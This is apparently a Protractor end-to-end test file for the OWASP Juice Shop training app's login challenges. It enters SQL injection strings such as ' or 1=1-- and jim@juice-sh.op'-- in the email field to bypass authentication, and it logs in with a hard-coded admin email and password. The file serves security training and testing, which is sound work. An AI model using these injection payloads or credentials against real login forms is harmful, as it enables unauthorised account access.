import {  browser, by, element, protractor } from 'protractor';


describe('/#/login', () => {
    let email, password, rememberMeCheckbox, loginButton,desclaimer
  
    beforeEach(() => {
      browser.get('/#/login')
      browser.manage().window().maximize()
      browser.manage().timeouts().implicitlyWait(5000)
      desclaimer = element(by.css('.close-dialog'))
      email = element(by.id('email'))
      password = element(by.id('password'))
      rememberMeCheckbox = element(by.id('rememberMe-input'))
      loginButton = element(by.id('loginButton'))
     
    })
  
    describe('challenge "loginAdmin"', () => {
      it('should log in Admin with SQL injection  on email field using or 1=1--', () => {
        desclaimer.click()
        email.sendKeys('\' or 1=1--')
        password.sendKeys('a')
        loginButton.click()
      })
    })

      describe('challenge "loginAdmin"', () => {
        it('should log in Admin with SQL injection on email field using "\'"', () => {
          email.sendKeys('\'')
          password.sendKeys('a')
          loginButton.click()
        })
      })
      describe('challenge "loginAdmin"', () => {
      it('should log in Admin with getting the password by tracing jwt token', () => {
        email.sendKeys('admin@juice-sh.op')
        password.sendKeys('admin123')
        loginButton.click()
     
      })
    })
    describe('challenge "loginJim"', () => {
      it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
        email.sendKeys('jim@' +'juice-sh.op'  + '\'--')
        password.sendKeys('a')
        loginButton.click()
      })
  
    })
  })
  
